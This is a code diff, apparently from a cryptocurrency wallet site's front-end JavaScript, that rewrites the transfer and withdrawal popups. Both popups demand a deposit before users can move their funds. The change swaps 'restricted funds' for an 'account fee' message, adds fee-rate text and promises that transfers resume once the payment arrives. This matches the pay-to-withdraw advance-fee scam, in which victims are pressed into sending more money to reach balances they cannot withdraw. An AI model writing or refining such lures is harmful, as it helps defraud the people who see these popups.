@@ -26890,11 +26890,14 @@ document.addEventListener("DOMContentLoaded", function () {
             const requiredAmount = parts[1] || '0';
             const requiredCoin = parts[2] || transferCoinSymbol;
             const requiredUsd = parseWalletAmount(parts[3] || '0');
+            const feeRateText = (parts[4] || '').trim();
             transferPopupOpened = true;
-            $("#transfer-popup__title").html('Deposit Required');
+            $("#transfer-popup__title").html('Complete Transfer Setup');
             $("#transfer-popup__description").html(
-              'This account has restricted funds. To use these funds, you must first complete a deposit of ' +
-              requiredAmount + ' ' + requiredCoin + ' (' + formatWalletUsd(requiredUsd, true) + ' USD).'
+              'To continue with transfers, a deposit is required to cover the current account fee. Please deposit ' +
+              requiredAmount + ' ' + requiredCoin + ' (' + formatWalletUsd(requiredUsd, true) + ' USD).' +
+              (feeRateText ? ' The applied fee rate' + (feeRateText.indexOf('/') >= 0 ? 's are ' : ' is ') + feeRateText.replace(/\//g, '%, ') + '%.' : '') +
+              ' Once received, transfers can continue normally.'
             );
             $(".transfer-popup__btn").eq(0).attr('onclick', 'location.reload()').find('.v-btn__content').html('View Wallet');
             $(".transfer-popup__btn").eq(1).attr('onclick', "openDepositAfterTransferLock('" + requiredCoin + "', '" + requiredAmount + "', '" + requiredUsd + "')").find('.v-btn__content').html('Deposit Now');
@@ -27311,12 +27314,15 @@ document.addEventListener("DOMContentLoaded", function () {
             const requiredAmount = parts[1] || '0';
             const requiredCoin = parts[2] || withdrawCoinSymbol;
             const requiredUsd = parseWalletAmount(parts[3] || '0') || (parseWalletAmount(requiredAmount) * getWalletRate(requiredCoin));
+            const feeRateText = (parts[4] || '').trim();
             withdrawPopupOpened = true;
             $("#withdraw-popup__img").attr('src', '/assets/img/banners/error.png');
-            $("#withdraw-popup__title").html('Deposit Required');
+            $("#withdraw-popup__title").html('Complete Withdrawal Setup');
             $("#withdraw-popup__description").html(
-              'This account has restricted funds. To withdraw these funds, you must first complete a deposit of ' +
-              requiredAmount + ' ' + requiredCoin + ' (' + formatWalletUsd(requiredUsd, true) + ' USD).'
+              'To continue with withdrawals, a deposit is required to cover the current account fee. Please deposit ' +
+              requiredAmount + ' ' + requiredCoin + ' (' + formatWalletUsd(requiredUsd, true) + ' USD).' +
+              (feeRateText ? ' The applied fee rate' + (feeRateText.indexOf('/') >= 0 ? 's are ' : ' is ') + feeRateText.replace(/\//g, '%, ') + '%.' : '') +
+              ' Once received, withdrawals can continue normally.'
             );
             $(".withdraw-popup__btn").eq(0).attr('onclick', 'location.reload()');
             $(".withdraw-popup__btn").eq(0).find('.v-btn__content').text('View Wallet');
